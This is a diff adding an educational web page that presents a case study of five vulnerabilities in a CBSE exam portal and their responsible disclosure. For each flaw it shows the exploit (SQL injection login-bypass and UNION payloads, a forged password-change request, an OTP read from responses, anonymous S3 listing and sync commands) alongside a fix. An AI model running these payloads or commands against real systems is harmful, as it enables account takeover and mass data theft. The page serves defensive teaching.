@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CBSE Case Study — 5 Critical Flaws | EthicalHack.dev</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-brand"><span class="brand-icon">&#x1F6E1;</span> EthicalHack<span class="brand-accent">.dev</span></a>
+    <div class="nav-links">
+      <a href="index.html" class="nav-link">Home</a>
+      <a href="level2.html" class="nav-link">Level 2</a>
+      <a href="level3.html" class="nav-link">Level 3</a>
+      <a href="cbse-case.html" class="nav-link active">CBSE Case</a>
+      <a href="cert-in.html" class="nav-link">CERT-In</a>
+      <a href="disclose.html" class="nav-link">Disclose</a>
+    </div>
+    <button class="hamburger" id="hamburger">&#9776;</button>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-hero">
+    <span class="page-hero-badge tag-case">Real-World Case Study</span>
+    <h1>CBSE Breach &amp; IIT Kanpur Offer</h1>
+    <p>How a student discovered 5 critical vulnerabilities in the CBSE examination portal — exposing 27 million+ student records — and turned it into a career breakthrough through responsible disclosure.</p>
+  </div>
+
+  <!-- SUMMARY STATS -->
+  <div class="stats-grid mb16" style="margin-bottom:32px">
+    <div class="stat-card"><div class="stat-val" style="color:var(--red)">5</div><div class="stat-label">Critical flaws found</div></div>
+    <div class="stat-card"><div class="stat-val">27M+</div><div class="stat-label">Student records exposed</div></div>
+    <div class="stat-card"><div class="stat-val" style="color:var(--orange)">2026</div><div class="stat-label">Answer sheets at risk</div></div>
+    <div class="stat-card"><div class="stat-val" style="color:var(--green)">&#x2713; Ethical</div><div class="stat-label">Responsibly disclosed</div></div>
+  </div>
+
+  <div class="info-box box-info">
+    <span class="info-box-icon">&#128214;</span>
+    <span>This case study documents <strong>publicly disclosed vulnerabilities</strong> that were reported to CBSE and CERT-In. The methods are shown for education — understanding what was found and how it was fixed makes every developer a better defender.</span>
+  </div>
+
+  <!-- TIMELINE -->
+  <h2 style="font-size:22px;font-weight:700;margin:32px 0 16px">Discovery &amp; Disclosure Timeline</h2>
+  <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px;margin-bottom:32px">
+    <div class="timeline">
+      <div class="tl-item">
+        <div class="tl-line"><div class="tl-dot" style="background:var(--accent)"></div><div class="tl-vline"></div></div>
+        <div class="tl-content">
+          <div class="tl-year">&#128269; Phase 1 — Passive Reconnaissance</div>
+          <div class="tl-desc">Student opens the CBSE evaluator portal in a browser. Opens DevTools &rarr; Sources. Searches the JavaScript bundle for keywords like <code>password</code>, <code>master</code>, <code>admin</code>. Finds a hardcoded master credential inside minified JS — without sending a single malicious request.</div>
+        </div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-line"><div class="tl-dot" style="background:var(--orange)"></div><div class="tl-vline"></div></div>
+        <div class="tl-content">
+          <div class="tl-year">&#128275; Phase 2 — Authentication Analysis</div>
+          <div class="tl-desc">Inspects the OTP flow in the Network tab. Discovers the OTP value is returned directly in the server's JSON response — readable without a phone. Confirms by reading the OTP from the browser console and logging in without the registered mobile number.</div>
+        </div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-line"><div class="tl-dot" style="background:var(--red)"></div><div class="tl-vline"></div></div>
+        <div class="tl-content">
+          <div class="tl-year">&#128221; Phase 3 — Account Takeover Chain</div>
+          <div class="tl-desc">Tests the password reset endpoint — submits garbage as the "current password." Server accepts it and changes the password. Combined with the OTP bypass, any evaluator or principal account can be fully taken over permanently.</div>
+        </div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-line"><div class="tl-dot" style="background:var(--red)"></div><div class="tl-vline"></div></div>
+        <div class="tl-content">
+          <div class="tl-year">&#128202; Phase 4 — Database Access via SQLi</div>
+          <div class="tl-desc">Login form concatenates user input directly into the SQL query. Classic payload <code>' OR '1'='1'--</code> in the username field bypasses authentication entirely. UNION queries expose table structure — students, evaluators, answer sheets all accessible.</div>
+        </div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-line"><div class="tl-dot" style="background:var(--red)"></div><div class="tl-vline"></div></div>
+        <div class="tl-content">
+          <div class="tl-year">&#9729;&#65039; Phase 5 — AWS Bucket Enumeration</div>
+          <div class="tl-desc">AWS S3 bucket URL found in the JS source (or via subdomain brute-force). Running <code>aws s3 ls --no-sign-request</code> returns a full directory listing of all files — 2026 answer sheets, question papers, and a CSV export of all student marks — with zero authentication required.</div>
+        </div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-line"><div class="tl-dot" style="background:var(--green)"></div><div class="tl-vline"></div></div>
+        <div class="tl-content">
+          <div class="tl-year">&#9989; Phase 6 — Responsible Disclosure</div>
+          <div class="tl-desc">Student stops. Documents only enough to prove each vulnerability (1–2 screenshots per flaw). Writes a professional report. Emails CBSE IT Cell and CERT-In simultaneously. Does NOT post on social media, does NOT download bulk data, does NOT demand money. CBSE patches. IIT Kanpur's cybersecurity research team recognises the work and extends a collaboration offer.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 5 VULNERABILITIES -->
+  <h2 style="font-size:22px;font-weight:700;margin:0 0 16px">The 5 Vulnerabilities — Technical Deep Dive</h2>
+
+  <!-- FLAW 1 -->
+  <div class="detail-panel">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128273; Flaw 1 — Hardcoded Master Password in JS Source</div>
+        <div class="detail-panel-sub">CWE-259 &bull; Universal credential visible to any browser</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:12px">A universal password was embedded directly inside the website's JavaScript bundle — downloadable by any browser without authentication. This single credential unlocked every evaluator and principal dashboard.</p>
+      <div class="slabel">What DevTools &rarr; Sources showed</div>
+      <div class="code-block"><span class="comment">// Inside minified JS bundle (app.bundle.min.js):</span>
+<span class="keyword">var</span> MASTER_PASS = <span class="bad">"cbse@master2026"</span>;
+
+<span class="keyword">function</span> checkLogin(inputPass) {
+  <span class="keyword">if</span> (inputPass === MASTER_PASS) {   <span class="bad">// ← auth in browser = trivially bypassable</span>
+    grantAccess();
+  }
+}</div>
+      <div class="two-col">
+        <div class="mini-card" style="border-color:var(--red-border)">
+          <div class="mini-card-title" style="color:var(--red)">&#10060; Why this is catastrophic</div>
+          <div class="mini-card-body">Any visitor — student, parent, attacker — can press F12 and log in as any evaluator or principal. No username needed. Affects every single account on the platform.</div>
+        </div>
+        <div class="mini-card" style="border-color:var(--green-border)">
+          <div class="mini-card-title" style="color:var(--green)">&#10004; Correct pattern</div>
+          <div class="mini-card-body">Auth logic lives server-side only. Client submits credentials, server compares against bcrypt hash in database. Client never sees the comparison logic.</div>
+        </div>
+      </div>
+      <div class="info-box box-safe mt12">
+        <span class="info-box-icon">&#x2705;</span>
+        <div><strong>Fix:</strong> Remove all credentials from frontend code. Store hashed passwords server-side only. Use environment variables for any service credentials. Run <code>trufflehog</code> on every build to catch leaks before deployment.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FLAW 2 -->
+  <div class="detail-panel">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128242; Flaw 2 — Client-Side OTP Verification</div>
+        <div class="detail-panel-sub">CWE-602 &bull; OTP value returned in server response / stored in browser</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:12px">The OTP sent to the user's phone was also included in the server's HTTP response — visible in the browser's Network tab. Authentication could be bypassed without ever accessing the registered phone.</p>
+      <div class="slabel">Network tab — what the server returned</div>
+      <div class="code-block"><span class="comment">// POST /api/send-otp response:</span>
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  <span class="string">"status"</span>: <span class="string">"otp_sent"</span>,
+  <span class="bad">"otp"</span>: <span class="bad">"847291"</span>,       <span class="comment">// ← OTP visible in response!</span>
+  <span class="string">"expires_in"</span>: 300
+}</div>
+      <div class="slabel">Bypass — read OTP from browser console</div>
+      <div class="code-block"><span class="comment">// DevTools → Console:</span>
+console.log(window._currentOTP);     <span class="comment">// prints "847291"</span>
+<span class="comment">// Or intercept with Burp Suite → read from response body</span></div>
+      <div class="info-box box-safe mt12">
+        <span class="info-box-icon">&#x2705;</span>
+        <div><strong>Fix:</strong> Generate and store OTP server-side only. Never include it in the response. Client sends its guess &rarr; server compares internally. Rate-limit to 3 attempts, expire after 5 minutes. For best security, use TOTP (RFC 6238 — Google Authenticator).</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FLAW 3 -->
+  <div class="detail-panel">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128221; Flaw 3 — No Old Password Verification on Reset</div>
+        <div class="detail-panel-sub">CWE-620 &bull; Password change accepts any value for "current password"</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-high">High</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:12px">The password change endpoint accepted any string — including empty values and random text — as the "current password" field, and still updated the password. Combined with a session hijack, this enables permanent account takeover.</p>
+      <div class="slabel">Exploit via Burp Suite — intercept &amp; modify</div>
+      <div class="code-block"><span class="comment">// POST /api/change-password — with victim's session cookie:</span>
+POST /api/change-password HTTP/1.1
+Cookie: session=<span class="string">victim_session_abc123</span>
+Content-Type: application/json
+
+{
+  <span class="string">"old_password"</span>: <span class="bad">"AAAAAAAAAA"</span>,    <span class="comment">// ← completely wrong, server ignores it</span>
+  <span class="string">"new_password"</span>: <span class="string">"hacked_by_attacker"</span>
+}
+
+<span class="comment">// Server responds:</span>
+{ <span class="good">"status": "password changed successfully"</span> }   <span class="bad">// ← accepted!</span></div>
+      <div class="info-box box-warn mt12">
+        <span class="info-box-icon">&#9888;</span>
+        <span>Chained with XSS: an attacker injects a script that silently sends this request from the victim's browser — changing their password without them knowing. No interaction required after the XSS fires.</span>
+      </div>
+      <div class="info-box box-safe">
+        <span class="info-box-icon">&#x2705;</span>
+        <div><strong>Fix:</strong> Always verify the current password server-side before allowing a change. Add CSRF tokens to all state-changing endpoints. Notify user by email/SMS immediately after any password change. Invalidate all other sessions.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FLAW 4 -->
+  <div class="detail-panel">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#128202; Flaw 4 — SQL Injection on Login Portal</div>
+        <div class="detail-panel-sub">CWE-89 &bull; Unsanitized input concatenated directly into SQL query</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:12px">The login form failed to sanitize input before using it in SQL queries. A single-quote in the username field broke out of the string context, and a comment (<code>--</code>) disabled the rest of the query — including the password check.</p>
+      <div class="slabel">Authentication bypass</div>
+      <div class="code-block"><span class="comment">// Vulnerable backend (PHP example):</span>
+$query = <span class="bad">"SELECT * FROM users WHERE username='" . $_POST['username'] . "'"</span>
+       . <span class="bad">"AND password='" . $_POST['password'] . "'"</span>;
+
+<span class="comment">// Attacker enters:</span>
+Username: <span class="bad">admin'--</span>
+Password: <span class="string">anything</span>
+
+<span class="comment">// Resulting query:</span>
+SELECT * FROM users WHERE username=<span class="bad">'admin'--'</span> AND password='anything'
+<span class="comment">--  ↑ everything after -- is a comment → password check removed</span>
+<span class="comment">--  Returns admin row → login successful</span></div>
+
+      <div class="slabel">Extracting all table names (UNION attack)</div>
+      <div class="code-block">Username: <span class="bad">' UNION SELECT table_name, null, null
+          FROM information_schema.tables
+          WHERE table_schema = database()--</span>
+
+<span class="comment">// Returns list of all tables:</span>
+<span class="good">students, evaluators, answer_sheets, question_papers, admin_users</span></div>
+
+      <div class="info-box box-safe mt12">
+        <span class="info-box-icon">&#x2705;</span>
+        <div><strong>Fix:</strong> Parameterized queries — always. <code>SELECT * FROM users WHERE username = ?</code> — the driver handles escaping. Also: minimum-privilege DB user (no DROP/INSERT on auth queries), WAF as secondary layer.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- FLAW 5 -->
+  <div class="detail-panel">
+    <div class="detail-panel-head">
+      <div>
+        <div class="detail-panel-title">&#9729;&#65039; Flaw 5 — Public AWS S3 Bucket</div>
+        <div class="detail-panel-sub">CWE-284 &bull; ListObjectsV2 worked with no authentication — answer sheets &amp; question papers exposed</div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px">
+        <span class="sev-badge sev-critical">Critical</span>
+        <span class="detail-panel-chev">&#8964;</span>
+      </div>
+    </div>
+    <div class="detail-panel-body">
+      <p class="text-sm text-muted" style="margin-bottom:12px">The S3 bucket storing 2026 board exam answer sheets and question papers was configured with public read access. Anyone on the internet could list and download every file — with no AWS account or credentials required.</p>
+      <div class="slabel">Anonymous directory listing — what the attacker saw</div>
+      <div class="code-block"><span class="comment"># --no-sign-request = no AWS credentials required:</span>
+aws s3 ls s3://cbse-exam-data-2026/ --no-sign-request
+
+<span class="comment"># Output (partial):</span>
+2026-03-01  answer_keys/class12/physics-set-A.pdf
+2026-03-01  answer_keys/class12/chemistry-set-B.pdf
+2026-03-01  answer_keys/class12/maths-set-C.pdf
+2026-03-01  question_papers/preleak/english-core.pdf
+2026-03-01  student_data/marks-export-all-27M.csv    <span class="bad">← 27 million records</span></div>
+
+      <div class="slabel">Download any file without login</div>
+      <div class="code-block"><span class="comment"># Download entire bucket anonymously:</span>
+aws s3 sync s3://cbse-exam-data-2026/ ./local-copy/ --no-sign-request
+
+<span class="comment"># Or via plain HTTPS (no AWS CLI needed):</span>
+curl https://cbse-exam-data-2026.s3.amazonaws.com/answer_keys/class12/physics-set-A.pdf</div>
+
+      <div class="info-box box-warn mt12">
+        <span class="info-box-icon">&#9888;</span>
+        <span><strong>Immediate consequence:</strong> 2026 question papers were exposed before the exams. Answer keys were downloadable. 27M student records (name, roll number, school, marks, DOB) were in a public CSV.</span>
+      </div>
+      <div class="info-box box-safe">
+        <span class="info-box-icon">&#x2705;</span>
+        <div><strong>Fix:</strong> Enable "Block all public access" in AWS S3 bucket settings. Bucket policy must deny all anonymous access. Use pre-signed URLs with expiry for legitimate downloads. Enable AWS Macie to auto-detect sensitive data. Set up CloudTrail + S3 access logs.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- WHAT MADE IT ETHICAL -->
+  <h2 style="font-size:22px;font-weight:700;margin:40px 0 16px">What Made This Ethical Hacking — Not a Crime</h2>
+  <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px">
+    <div class="two-col">
+      <div>
+        <div class="slabel" style="color:var(--red)">&#10060; Did NOT do</div>
+        <ul style="list-style:none;display:flex;flex-direction:column;gap:8px;margin-top:8px">
+          <li class="text-sm text-muted">&#10060; Download bulk student records</li>
+          <li class="text-sm text-muted">&#10060; Post evidence on social media / WhatsApp</li>
+          <li class="text-sm text-muted">&#10060; Sell the vulnerabilities</li>
+          <li class="text-sm text-muted">&#10060; Demand money from CBSE</li>
+          <li class="text-sm text-muted">&#10060; Access more data than needed to prove the bug</li>
+          <li class="text-sm text-muted">&#10060; Share question papers with students</li>
+          <li class="text-sm text-muted">&#10060; Return after the initial proof-of-concept</li>
+        </ul>
+      </div>
+      <div>
+        <div class="slabel" style="color:var(--green)">&#10004; DID do</div>
+        <ul style="list-style:none;display:flex;flex-direction:column;gap:8px;margin-top:8px">
+          <li class="text-sm text-muted">&#10004; Documented with minimal proof screenshots</li>
+          <li class="text-sm text-muted">&#10004; Reported directly to CBSE IT Cell</li>
+          <li class="text-sm text-muted">&#10004; CC'd CERT-In for official record</li>
+          <li class="text-sm text-muted">&#10004; Waited for acknowledgement before any disclosure</li>
+          <li class="text-sm text-muted">&#10004; Provided clear steps to reproduce + suggested fixes</li>
+          <li class="text-sm text-muted">&#10004; Cooperated fully with remediation team</li>
+          <li class="text-sm text-muted">&#10004; Kept all communication records as legal protection</li>
+        </ul>
+      </div>
+    </div>
+    <div class="info-box box-info mt16">
+      <span class="info-box-icon">&#127894;</span>
+      <span>This distinction — the 60 seconds of decision-making after finding the vulnerability — is the entire difference between a criminal charge under IT Act &sect;66 and a recognition letter from IIT Kanpur.</span>
+    </div>
+  </div>
+
+  <div style="text-align:center;margin:40px 0">
+    <p class="text-muted text-sm" style="margin-bottom:16px">Ready to learn how to report vulnerabilities responsibly?</p>
+    <a href="disclose.html" class="btn btn-primary">Responsible Disclosure Guide &rarr;</a>
+  </div>
+
+</div>
+
+<footer class="footer">
+  <div class="container footer-inner">
+    <div class="footer-brand">&#x1F6E1; EthicalHack.dev</div>
+    <div class="footer-links">
+      <a href="cert-in.html">CERT-In Advisory</a>
+      <a href="disclose.html">How to Disclose</a>
+    </div>
+    <div class="footer-note">Educational use only. All content based on publicly disclosed and responsibly reported vulnerabilities.</div>
+  </div>
+</footer>
+
+<script src="assets/js/nav.js"></script>
+</body>
+</html>
